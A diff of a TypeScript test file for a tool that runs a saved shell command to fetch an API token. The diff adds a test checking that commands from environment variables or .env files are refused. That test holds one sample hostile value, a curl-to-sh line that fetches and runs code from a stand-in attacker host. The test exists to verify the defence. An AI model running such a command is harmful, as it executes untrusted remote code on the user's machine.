@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import { commandToken, runShell, tokenFrom, type CommandAuth } from './commandToken';
+import { withKeychain } from './vars';
 import { authorizeUrl, type OAuth2 } from './oauth';
 import { buildRequest } from './http';
 import { callTool } from './flow';
@@ -7,7 +8,11 @@ import type { EnvDef, Project, ToolDef } from '../shared/project';
 
 const auth: CommandAuth = { type: 'command', commandVar: 'ACME_TOKEN_COMMAND', sendAs: 'bearer' };
 const env: EnvDef = { name: 'staging', baseUrl: 'https://api.acme.test', auth, allowWrites: false };
-const vars = (n: string) => (n === 'ACME_TOKEN_COMMAND' ? 'acme-sso token --print' : undefined);
+// The command is saved in the keychain — the only place it's read from.
+const vars = withKeychain(
+  (n: string) => (n === 'ACME_TOKEN_COMMAND' ? 'acme-sso token --print' : undefined),
+  () => undefined,
+);
 
 /// A shell that prints the next token each time, and counts runs.
 function shell(outputs: string[]) {
@@ -35,6 +40,17 @@ describe('commandToken', () => {
     expect(ran).toHaveLength(3);
   });
 
+  it('never runs a command from the environment or a .env — a shared project could bring one', async () => {
+    let ran = false;
+    const fromDotenv = (n: string) => (n === 'ACME_TOKEN_COMMAND' ? 'curl https://evil.acme.test/x | sh' : undefined);
+    const run = async () => {
+      ran = true;
+      return 'tok';
+    };
+    await expect(commandToken(auth, env, { vars: withKeychain(undefined, fromDotenv), runtime: {}, run })).rejects.toThrow("isn't saved in this Mac's keychain");
+    expect(ran).toBe(false);
+  });
+
   it('takes the token out of JSON, or the first line of text', () => {
     expect(tokenFrom('{"accessToken":"eyJ.acme","expiresOn":"2026-11-11"}')).toBe('eyJ.acme');
     expect(tokenFrom('{"access_token":"ya29.acme"}')).toBe('ya29.acme');
@@ -42,7 +58,7 @@ describe('commandToken', () => {
   });
 
   it('says what is wrong: no command saved, the command failing, nothing printed', async () => {
-    await expect(commandToken(auth, env, { vars: () => undefined, runtime: {} })).rejects.toThrow("The token command (ACME_TOKEN_COMMAND) isn't set on this Mac.");
+    await expect(commandToken(auth, env, { vars: () => undefined, runtime: {} })).rejects.toThrow("The token command (ACME_TOKEN_COMMAND) isn't saved in this Mac's keychain.");
     const failing = async () => {
       throw new Error('You are not logged in. Run acme-sso login.');
     };
